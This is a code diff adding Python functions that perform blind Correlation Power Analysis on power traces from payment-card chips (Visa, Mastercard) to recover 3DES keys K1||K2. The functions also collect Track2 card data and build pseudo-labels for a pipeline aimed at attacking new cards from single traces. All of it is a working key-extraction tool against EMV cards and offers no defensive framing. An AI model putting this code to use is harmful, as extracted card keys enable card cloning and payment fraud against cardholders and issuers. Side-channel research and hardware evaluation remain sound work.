@@ -186,3 +186,438 @@ def run_cpa_attack():
         
 if __name__ == "__main__":
     run_cpa_attack()
+
+
+# ---------------------------------------------------------------------------
+# Blind CPA Key Recovery (no trained models or ground-truth keys required)
+# ---------------------------------------------------------------------------
+
+def _parse_atc_to_bytes(atc_str: str) -> bytes:
+    """Parse ATC like '02 5B' (up to 16 hex nibbles) to 8-byte block, zero-padded."""
+    s = str(atc_str).replace(" ", "").strip().upper()
+    if not s or s == "NAN":
+        return b"\x00" * 8
+    s = s.zfill(16)[:16]
+    try:
+        return bytes.fromhex(s)
+    except ValueError:
+        return b"\x00" * 8
+
+
+def run_cpa_blind_recovery(
+    input_dir: str,
+    processed_dir: str,
+    output_dir: str,
+    card_type: str = "visa",
+    n_traces_max: int = 0,
+) -> dict:
+    """
+    Fully blind Correlation Power Analysis (CPA) key recovery for 3DES traces.
+    No ground-truth keys, APDU responses, or prior trained models are required.
+
+    Requirements per CSV file
+    -------------------------
+    - ``trace_data``  column : comma-separated float power samples
+    - ``ATC``         column : hex Application Transaction Counter (plaintext proxy)
+    - ``Track2``      column : optional, used in output metadata
+    - ``UN``          column : optional, stored in metadata
+
+    Attack strategy
+    ---------------
+    * Stage 1 — Pearson CPA on the first 1/3 of trace samples
+                -> recovers RK1  (Round Key 1)  of K1.
+    * Stage 2 — Pearson CPA on the middle 1/3 of trace samples
+                -> recovers RK16 (Round Key 16) of K2, which is the first sub-key
+                  applied during K2's decryption pass in 3DES.
+    * 8 PC2-ambiguous bits remain per key half (256 candidates each).
+      ``candidates[0]`` (zeros for unknown bits) is returned as the default guess.
+    * Full 3DES key is returned as K1 || K2 (32 hex chars = 16 bytes).
+
+    Parameters
+    ----------
+    input_dir     : Directory (searched recursively) containing the CSV trace files.
+    processed_dir : Destination for ``Y_meta.csv`` (required by report generation).
+    output_dir    : Destination for ``cpa_result.json`` (detailed recovery summary).
+    card_type     : Profile label stored in the JSON summary (e.g. ``'visa'``).
+    n_traces_max  : Maximum traces to load (0 = load all).
+
+    Returns
+    -------
+    dict with keys: ``3DES_KENC`` (list[str] x N), ``3DES_KMAC``, ``3DES_KDEK``,
+    ``cpa_k1``, ``cpa_k2``, ``cpa_k1_candidates``, ``cpa_k2_candidates``, ``n_traces``.
+    """
+    import glob
+    from src.crypto import (
+        generate_key_candidates_from_rk1,
+        generate_key_candidates_from_rk16,
+        IP as _IP_SRC,       # correct DES IP: first 32 outputs = L0, last 32 = R0
+        E_TABLE as _E_SRC,   # correct E-expansion table (0-indexed into R0)
+    )
+
+    # ------------------------------------------------------------------
+    # 1. Load CSV trace files
+    # ------------------------------------------------------------------
+    csv_files = sorted(glob.glob(os.path.join(input_dir, "**", "*.csv"), recursive=True))
+    if not csv_files:
+        raise FileNotFoundError(f"No CSV files found under {input_dir}")
+    logger.info("[CPA] Loading traces from %d CSV file(s) ...", len(csv_files))
+
+    all_traces: list = []
+    all_atc:    list = []
+    all_track2: list = []
+    all_un:     list = []
+
+    for fpath in csv_files:
+        df_f = pd.read_csv(fpath)
+        if "trace_data" not in df_f.columns or "ATC" not in df_f.columns:
+            logger.warning("[CPA] Skipping %s: missing trace_data/ATC", os.path.basename(fpath))
+            continue
+        if n_traces_max > 0:
+            remaining = n_traces_max - len(all_traces)
+            if remaining <= 0:
+                break
+            df_f = df_f.head(remaining)
+
+        for row_str in df_f["trace_data"].values:
+            t = np.fromstring(str(row_str), dtype=np.float32, sep=",")
+            all_traces.append(t)
+
+        all_atc.extend(df_f["ATC"].astype(str).tolist())
+        all_track2.extend(df_f["Track2"].astype(str).tolist() if "Track2" in df_f.columns else [""] * len(df_f))
+        all_un.extend(df_f["UN"].astype(str).tolist() if "UN" in df_f.columns else [""] * len(df_f))
+        logger.info("[CPA]   %s -> %d traces", os.path.basename(fpath), len(df_f))
+
+    N = len(all_traces)
+    if N == 0:
+        raise ValueError("No valid traces could be loaded from input_dir CSV files")
+
+    T = min(len(t) for t in all_traces)
+    traces = np.stack([t[:T] for t in all_traces], axis=0).astype(np.float32)  # (N, T)
+    logger.info("[CPA] Dataset: N=%d traces x T=%d samples/trace", N, T)
+
+    # ------------------------------------------------------------------
+    # 2. Save Y_meta.csv for downstream report generation
+    # ------------------------------------------------------------------
+    os.makedirs(processed_dir, exist_ok=True)
+    meta_df = pd.DataFrame({"Track2": all_track2, "ATC": all_atc, "UN": all_un})
+    meta_path = os.path.join(processed_dir, "Y_meta.csv")
+    meta_df.to_csv(meta_path, index=False)
+    logger.info("[CPA] Metadata saved: %s", meta_path)
+
+    # ------------------------------------------------------------------
+    # 3. ATC -> 8-byte plaintext -> IP -> R0 -> E-expansion -> 6-bit chunks
+    # IP_TABLE and E_TABLE are defined at module level (0-based indices)
+    # ------------------------------------------------------------------
+    plaintexts = np.array(
+        [list(_parse_atc_to_bytes(a)) for a in all_atc], dtype=np.uint8
+    )  # (N, 8)
+    pt_bits = np.unpackbits(plaintexts, axis=1)   # (N, 64)
+    # Use src.crypto's IP (standard DES order: positions 0-31 = L0, 32-63 = R0).
+    # cpa_attack.py's module-level IP_TABLE has L0/R0 swapped, so we import correctly.
+    _IP  = np.array(_IP_SRC, dtype=np.intp)
+    _ET  = np.array(_E_SRC,  dtype=np.intp)
+    pt_ip   = pt_bits[:, _IP]                     # (N, 64) IP-permuted bits
+    r0      = pt_ip[:, 32:]                       # (N, 32) R0 — right half after IP
+    r0_exp  = r0[:, _ET]                          # (N, 48) after E-expansion
+
+    p_chunks = np.zeros((N, 8), dtype=np.uint8)   # 6-bit S-box input per S-box
+    for sb in range(8):
+        bits_sb = r0_exp[:, sb * 6: (sb + 1) * 6]  # (N, 6)
+        val = np.zeros(N, dtype=np.uint8)
+        for b in range(6):
+            val = (val << 1) | bits_sb[:, b].astype(np.uint8)
+        p_chunks[:, sb] = val
+
+    # ------------------------------------------------------------------
+    # 4. Precompute HW(SBox[s](x)) for all 8 S-boxes x 64 input values
+    # ------------------------------------------------------------------
+    hw_sbox = np.zeros((8, 64), dtype=np.float32)
+    for sb in range(8):
+        for x in range(64):
+            out = des_sbox_output(sb, x)          # 4-bit output (0-15)
+            hw_sbox[sb, x] = bin(out).count("1")
+
+    # ------------------------------------------------------------------
+    # 5. Vectorised Pearson CPA over a time window
+    # ------------------------------------------------------------------
+    def _cpa_window(t_win: np.ndarray) -> np.ndarray:
+        """
+        t_win : (N, W) float32 — trace samples for the window.
+        Returns : (8,) uint8  — best 6-bit RK chunk per S-box.
+        """
+        t_c  = t_win - t_win.mean(axis=0)          # column-centred (N, W)
+        t_sq = np.sum(t_c ** 2, axis=0)            # (W,) variance denominator
+
+        recovered = np.zeros(8, dtype=np.uint8)
+        for sb in range(8):
+            best_k, best_corr = 0, -1.0
+            for k_guess in range(64):
+                xor_v  = p_chunks[:, sb] ^ np.uint8(k_guess)   # (N,)
+                hw_m   = hw_sbox[sb, xor_v]                     # (N,) float32
+                h_c    = hw_m - hw_m.mean()                     # (N,) centred
+                h_sq   = float(np.dot(h_c, h_c))
+                if h_sq < 1e-10:
+                    continue
+                cov   = h_c @ t_c                               # (W,) vectorised
+                denom = np.sqrt(t_sq * h_sq)
+                denom[denom < 1e-10] = 1e-10
+                peak  = float(np.max(np.abs(cov / denom)))
+                if peak > best_corr:
+                    best_corr = peak
+                    best_k    = k_guess
+
+            recovered[sb] = best_k
+            logger.info(
+                "[CPA]     S-box %d -> k=0x%02X (%2d)  peak_corr=%.4f",
+                sb + 1, best_k, best_k, best_corr,
+            )
+        return recovered
+
+    # ------------------------------------------------------------------
+    # 6. Stage 1: first third of trace -> RK1 -> K1
+    # ------------------------------------------------------------------
+    T_s1 = T // 3
+    logger.info("[CPA] Stage 1 (samples 0 .. %d) -> RK1 of K1 ...", T_s1)
+    rk1_chunks = _cpa_window(traces[:, :T_s1])
+
+    # ------------------------------------------------------------------
+    # 7. Stage 2: middle third of trace -> RK16 -> K2
+    # ------------------------------------------------------------------
+    T_s2_a, T_s2_b = T // 3, (2 * T) // 3
+    logger.info("[CPA] Stage 2 (samples %d .. %d) -> RK16 of K2 ...", T_s2_a, T_s2_b)
+    rk16_chunks = _cpa_window(traces[:, T_s2_a:T_s2_b])
+
+    # ------------------------------------------------------------------
+    # 8. Reconstruct candidate keys (256 per key half due to PC2 ambiguity)
+    # ------------------------------------------------------------------
+    k1_candidates  = generate_key_candidates_from_rk1([int(x) for x in rk1_chunks])
+    k2_candidates  = generate_key_candidates_from_rk16([int(x) for x in rk16_chunks])
+
+    # Without T_DES_* ground truth, candidates[0] uses zeros for the 8 unknown bits.
+    k1_hex       = f"{k1_candidates[0]:016X}"
+    k2_hex       = f"{k2_candidates[0]:016X}"
+    full_key_hex = k1_hex + k2_hex              # K1 || K2, 32 hex chars
+
+    logger.info("[CPA] Recovered K1 (48 of 56 bits confirmed): %s", k1_hex)
+    logger.info("[CPA] Recovered K2 (48 of 56 bits confirmed): %s", k2_hex)
+    logger.info("[CPA] 3DES key K1||K2: %s", full_key_hex)
+    logger.info(
+        "[CPA] %d K1 candidates / %d K2 candidates (8 PC2-ambiguous bits per half)",
+        len(k1_candidates), len(k2_candidates),
+    )
+
+    # ------------------------------------------------------------------
+    # 9. Persist detailed JSON summary
+    # ------------------------------------------------------------------
+    os.makedirs(output_dir, exist_ok=True)
+    summary = {
+        "method":               "Pearson_CPA",
+        "card_type":            card_type,
+        "n_traces":             N,
+        "trace_samples":        T,
+        "K1_default":           k1_hex,
+        "K2_default":           k2_hex,
+        "full_key_K1K2_default": full_key_hex,
+        "rk1_chunks":           [f"0x{int(x):02X}" for x in rk1_chunks],
+        "rk16_chunks":          [f"0x{int(x):02X}" for x in rk16_chunks],
+        "n_k1_candidates":      len(k1_candidates),
+        "n_k2_candidates":      len(k2_candidates),
+        "k1_candidates_top10":  [f"{c:016X}" for c in k1_candidates[:10]],
+        "k2_candidates_top10":  [f"{c:016X}" for c in k2_candidates[:10]],
+        "pc2_note": (
+            "8 bits per key half are PC2-ambiguous and cannot be resolved by CPA alone. "
+            "Provide T_DES_* ground truth or an APDU Application Cryptogram to select "
+            "the correct candidate from the 256 available."
+        ),
+    }
+    result_path = os.path.join(output_dir, "cpa_result.json")
+    with open(result_path, "w") as f:
+        json.dump(summary, f, indent=2)
+    logger.info("[CPA] Summary written to %s", result_path)
+
+    return {
+        "3DES_KENC": [full_key_hex] * N,
+        "3DES_KMAC": [""] * N,
+        "3DES_KDEK": [""] * N,
+        "cpa_k1":            k1_hex,
+        "cpa_k2":            k2_hex,
+        "cpa_k1_candidates": k1_candidates,
+        "cpa_k2_candidates": k2_candidates,
+        "n_traces":          N,
+    }
+
+
+# ---------------------------------------------------------------------------
+# CPA Pseudo-Label Generator — for unsupervised Visa training pipeline
+# ---------------------------------------------------------------------------
+
+def generate_cpa_external_label_map(
+    input_dir: str,
+    processed_dir: str,
+    card_type: str = "visa",
+    n_cpa_traces: int = 3000,
+    model_root: str = "",
+) -> dict:
+    """
+    Run CPA on a batch of blind traces (no keys required) and return an
+    ``external_label_map`` dict that can be passed directly to
+    ``perform_feature_extraction`` / ``TraceDataset`` so that the standard
+    supervised training pipeline generates correct S-box labels.
+
+    The function also saves ``cpa_keys.json`` to both ``processed_dir`` and
+    (when ``model_root`` is given) ``model_root``, so that the inference step
+    can resolve the 8 PC2-ambiguous bits at attack time without accessing any
+    ground-truth columns.
+
+    Parameters
+    ----------
+    input_dir     : Directory with CSV trace files (trace_data + ATC required).
+    processed_dir : Where ``cpa_keys.json`` is written (created if needed).
+    card_type     : ``'visa'``, ``'mastercard'``, or ``'universal'``.
+    n_cpa_traces  : Maximum traces to load for the CPA step (3000 is sufficient
+                    for most setups; 0 = use all available).
+    model_root    : Optional; also copies ``cpa_keys.json`` here for later use
+                    by inference runs against new single traces.
+
+    Returns
+    -------
+    dict  :  ``{ "<card_type>|ANY" : {"T_DES_KENC": hex32, "T_DES_KMAC": hex32,
+                                       "T_DES_KDEK": hex32} }``
+             suitable for passing as ``cpa_label_map`` to ``preprocess_3des``.
+    """
+    import glob
+    from src.crypto import (
+        generate_key_candidates_from_rk1,
+        generate_key_candidates_from_rk16,
+        IP as _IP_SRC,
+        E_TABLE as _E_SRC,
+    )
+
+    # ------------------------------------------------------------------ 1. load
+    csv_files = sorted(glob.glob(os.path.join(input_dir, "**", "*.csv"), recursive=True))
+    if not csv_files:
+        raise FileNotFoundError(f"No CSV files under {input_dir}")
+
+    all_traces: list = []
+    all_atc:    list = []
+    limit = n_cpa_traces if n_cpa_traces > 0 else int(1e9)
+    for fpath in csv_files:
+        if len(all_traces) >= limit:
+            break
+        df_f = pd.read_csv(fpath)
+        if "trace_data" not in df_f.columns or "ATC" not in df_f.columns:
+            continue
+        need = limit - len(all_traces)
+        df_f = df_f.head(need)
+        for row_str in df_f["trace_data"].values:
+            all_traces.append(np.fromstring(str(row_str), dtype=np.float32, sep=","))
+        all_atc.extend(df_f["ATC"].astype(str).tolist())
+
+    N = len(all_traces)
+    if N == 0:
+        raise ValueError("No valid traces loaded from input_dir CSV files")
+
+    T = min(len(t) for t in all_traces)
+    traces = np.stack([t[:T] for t in all_traces], axis=0).astype(np.float32)
+    logger.info("[CPA-LABEL] Using %d traces x %d samples for pseudo-label CPA", N, T)
+
+    # ------------------------------------------------------------------ 2. ATC -> E-expanded R0 chunks
+    _IP  = np.array(_IP_SRC,  dtype=np.intp)
+    _ET  = np.array(_E_SRC,   dtype=np.intp)
+    plaintexts = np.array([list(_parse_atc_to_bytes(a)) for a in all_atc], dtype=np.uint8)
+    pt_bits    = np.unpackbits(plaintexts, axis=1)
+    pt_ip      = pt_bits[:, _IP]
+    r0         = pt_ip[:, 32:]
+    r0_exp     = r0[:, _ET]
+    p_chunks   = np.zeros((N, 8), dtype=np.uint8)
+    for sb in range(8):
+        bits_sb = r0_exp[:, sb * 6:(sb + 1) * 6]
+        val     = np.zeros(N, dtype=np.uint8)
+        for b in range(6):
+            val = (val << 1) | bits_sb[:, b].astype(np.uint8)
+        p_chunks[:, sb] = val
+
+    # ------------------------------------------------------------------ 3. HW table
+    hw_sbox = np.zeros((8, 64), dtype=np.float32)
+    for sb in range(8):
+        for x in range(64):
+            hw_sbox[sb, x] = bin(des_sbox_output(sb, x)).count("1")
+
+    # ------------------------------------------------------------------ 4. Pearson CPA (vectorised)
+    def _cpa_best_chunks(t_win: np.ndarray) -> np.ndarray:
+        t_c  = t_win - t_win.mean(axis=0)
+        t_sq = np.sum(t_c ** 2, axis=0)
+        recovered = np.zeros(8, dtype=np.uint8)
+        for sb in range(8):
+            best_k, best_corr = 0, -1.0
+            for k_guess in range(64):
+                xor_v = p_chunks[:, sb] ^ np.uint8(k_guess)
+                hw_m  = hw_sbox[sb, xor_v]
+                h_c   = hw_m - hw_m.mean()
+                h_sq  = float(np.dot(h_c, h_c))
+                if h_sq < 1e-10:
+                    continue
+                cov  = h_c @ t_c
+                denom = np.sqrt(t_sq * h_sq)
+                denom[denom < 1e-10] = 1e-10
+                peak = float(np.max(np.abs(cov / denom)))
+                if peak > best_corr:
+                    best_corr = peak
+                    best_k    = k_guess
+            recovered[sb] = best_k
+        return recovered
+
+    T_s1 = T // 3
+    T_s2_a, T_s2_b = T // 3, (2 * T) // 3
+    logger.info("[CPA-LABEL] Stage 1 (0..%d) ...", T_s1)
+    rk1_chunks  = _cpa_best_chunks(traces[:, :T_s1])
+    logger.info("[CPA-LABEL] Stage 2 (%d..%d) ...", T_s2_a, T_s2_b)
+    rk16_chunks = _cpa_best_chunks(traces[:, T_s2_a:T_s2_b])
+
+    # ------------------------------------------------------------------ 5. Reconstruct keys
+    k1_candidates  = generate_key_candidates_from_rk1([int(x) for x in rk1_chunks])
+    k2_candidates  = generate_key_candidates_from_rk16([int(x) for x in rk16_chunks])
+    k1_hex       = f"{k1_candidates[0]:016X}"
+    k2_hex       = f"{k2_candidates[0]:016X}"
+    full_key_hex = k1_hex + k2_hex
+    logger.info("[CPA-LABEL] CPA pseudo-key K1||K2: %s", full_key_hex)
+
+    # ------------------------------------------------------------------ 6. Save cpa_keys.json
+    # The same key is stored as KENC/KMAC/KDEK because we cannot distinguish the
+    # three 3DES key slots via CPA alone (they differ only by the card master key
+    # schedule, not by their S-box leakage signatures).
+    cpa_record = {
+        "card_type":   card_type,
+        "T_DES_KENC":  full_key_hex,
+        "T_DES_KMAC":  full_key_hex,
+        "T_DES_KDEK":  full_key_hex,
+        "K1":          k1_hex,
+        "K2":          k2_hex,
+        "rk1_chunks":  [f"0x{int(x):02X}" for x in rk1_chunks],
+        "rk16_chunks": [f"0x{int(x):02X}" for x in rk16_chunks],
+        "n_cpa_traces": N,
+        "label_map_key": f"{card_type.lower()}|ANY",
+        "pc2_note": (
+            "8 bits per key half are PC2-ambiguous.  candidates[0] (zero-default) "
+            "is used, giving a consistent answer for this card batch even though the "
+            "physical chip key may differ in those 8 bits."
+        ),
+    }
+    os.makedirs(processed_dir, exist_ok=True)
+    keys_path = os.path.join(processed_dir, "cpa_keys.json")
+    with open(keys_path, "w") as f:
+        json.dump(cpa_record, f, indent=2)
+    logger.info("[CPA-LABEL] cpa_keys.json -> %s", keys_path)
+
+    if model_root:
+        os.makedirs(model_root, exist_ok=True)
+        mr_path = os.path.join(model_root, "cpa_keys.json")
+        with open(mr_path, "w") as f:
+            json.dump(cpa_record, f, indent=2)
+        logger.info("[CPA-LABEL] cpa_keys.json -> %s (model root copy)", mr_path)
+
+    # ------------------------------------------------------------------ 7. Return external_label_map
+    map_key = f"{card_type.lower()}|ANY"
+    label_entry = {"T_DES_KENC": full_key_hex, "T_DES_KMAC": full_key_hex, "T_DES_KDEK": full_key_hex}
+    return {map_key: label_entry}
+
